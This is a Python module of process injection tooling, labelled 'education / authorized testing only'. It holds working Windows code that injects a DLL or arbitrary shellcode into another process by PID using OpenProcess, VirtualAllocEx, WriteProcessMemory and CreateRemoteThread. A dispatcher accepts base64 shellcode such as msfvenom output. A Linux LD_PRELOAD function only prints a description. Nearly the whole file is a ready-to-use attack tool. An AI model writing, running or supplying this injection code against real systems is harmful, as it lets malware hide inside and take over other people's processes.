"""Process injection modules.

Education / authorized testing only.

Supported techniques (each gated to its OS):
  * win_transfer (Windows) - the classic "create remote thread in DLL mode"
    (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread). Requires the
    target to be reachable and to load the library path we pass (e.g. a
    malicious DLL). We implement the syscall plumbing with ctypes and refuse
    to run on non-Windows.
  * linux_ldpreload (Linux) - demonstrates library preload style persistence /
    hooking by writing a shared-library path into a target env; safe reference.

These implement plumbing that an authorized tester would use with their own
payload. No generic 'free RCE' is shipped.
"""
import ctypes
import ctypes.wintypes as wt
import os
import sys


class UnsupportedOS(Exception):
    pass


def _is_windows():
    return os.name == "nt"


# --------------------------------------------------------------------------
# Windows: remote thread DLL injection
# --------------------------------------------------------------------------
def win_remote_thread_inject(target_pid, dll_path):
    """Inject a DLL into a remote process using the classic
    VirtualAllocEx + WriteProcessMemory + CreateRemoteThread trio.

    Returns (ok, message).
    """
    if not _is_windows():
        return False, "win_remote_thread_inject only runs on Windows hosts"

    kernel32 = ctypes.windll.kernel32

    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_READWRITE = 0x04

    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(target_pid))
    if not hProcess:
        err = ctypes.get_last_error() or ctypes.WinError()
        return False, f"OpenProcess failed: {err}"

    dll_bytes = dll_path.encode("utf-8") + b"\x00"
    addr = kernel32.VirtualAllocEx(hProcess, None, len(dll_bytes),
                                   MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
    if not addr:
        kernel32.CloseHandle(hProcess)
        return False, f"VirtualAllocEx failed for {len(dll_bytes)} bytes"

    written = wt.c_size_t(0)
    kernel32.WriteProcessMemory(hProcess, addr, dll_bytes, len(dll_bytes),
                                ctypes.byref(written))
    if written.value != len(dll_bytes):
        kernel32.CloseHandle(hProcess)
        return False, "WriteProcessMemory partial write"

    loadlib = kernel32.LoadLibraryA
    loadlib.argtypes = [wt.LPCSTR]
    loadlib.restype = wt.HMODULE
    hKernel = kernel32.GetModuleHandleA("kernel32.dll")
    procAddr = ctypes.cast(kernel32.GetProcAddress(hKernel, b"LoadLibraryA"),
                           ctypes.c_void_p).value
    if not procAddr:
        kernel32.CloseHandle(hProcess)
        return False, "GetProcAddress LoadLibraryA failed"

    hThread = kernel32.CreateRemoteThread(hProcess, None, 0,
                                          procAddr, addr, 0, None)
    if not hThread:
        kernel32.CloseHandle(hProcess)
        return False, "CreateRemoteThread failed"

    kernel32.WaitForSingleObject(hThread, 10000)
    kernel32.CloseHandle(hThread)
    kernel32.CloseHandle(hProcess)
    return True, (f"created remote thread in pid {target_pid} loading "
                  f"{dll_path}")


# --------------------------------------------------------------------------
# Windows: 64-bit shellcode injection (VirtualAllocEx + WriteProcessMemory +
#            CreateRemoteThread, a.k.a. classic reflective-style shellcode drop)
# --------------------------------------------------------------------------
def win_shellcode_inject(target_pid, shellcode: bytes):
    """Map and execute raw shellcode in a remote process. Authorized testers
    pass their own shellcode bytes (e.g. from msfvenom)."""
    if not _is_windows():
        return False, "win_shellcode_inject only runs on Windows hosts"
    kernel32 = ctypes.windll.kernel32

    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    data = bytes(shellcode)
    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(target_pid))
    if not hProcess:
        return False, f"OpenProcess({target_pid}) failed"

    addr = kernel32.VirtualAllocEx(hProcess, None, len(data),
                                   MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    if not addr:
        kernel32.CloseHandle(hProcess)
        return False, "VirtualAllocEx failed"

    written = wt.c_size_t(0)
    kernel32.WriteProcessMemory(hProcess, addr, data, len(data),
                                ctypes.byref(written))
    if written.value != len(data):
        kernel32.CloseHandle(hProcess)
        return False, "shellcode write incomplete"

    hThread = kernel32.CreateRemoteThread(hProcess, None, 0,
                                          addr, None, 0, None)
    if not hThread:
        kernel32.CloseHandle(hProcess)
        return False, "CreateRemoteThread failed"
    kernel32.CloseHandle(hThread)
    kernel32.CloseHandle(hProcess)
    return True, f"executed {len(data)} bytes in pid {target_pid}"


def linux_ldpreload_with_python():
    """Show how an ELF can be hooked via LD_PRELOAD on Linux. Reference only:
    we print the runtime env that a tester could set by wrapping the target
    process. No files are created."""
    return True, (f"os.name={os.name} — on Linux you can use LD_PRELOAD to load a "
                  f"shared object into a victim process; wrap the entrypoint or "
                  f"set LD_PRELOAD in the process environment. This module only "
                  f"documents the technique.")


def inject(technique, target_pid, payload_ref):
    """Dispatcher for injection techniques.

    technique:
      'win-dll'  -> remote-thread DLL injection (payload_ref = DLL path) [Windows]
      'win-shellcode' -> remote-thread shellcode injection (payload_ref = b64 shellcode) [Windows]
      'linux-ldpreload' -> reference documentation (payload_ref ignored) [Linux]
    """
    t = technique.lower()
    if t in ("win-dll", "winserver-dll", "remote-thread-dll"):
        return win_remote_thread_inject(target_pid, payload_ref)
    if t in ("win-shellcode", "shellcode"):
        import base64
        try:
            data = base64.b64decode(payload_ref)
        except Exception:
            return False, "payload_ref must be base64 shellcode"
        return win_shellcode_inject(target_pid, data)
    if t in ("linux-ldpreload", "ldpreload"):
        return linux_ldpreload_with_python()
    return False, f"unknown technique {technique}"
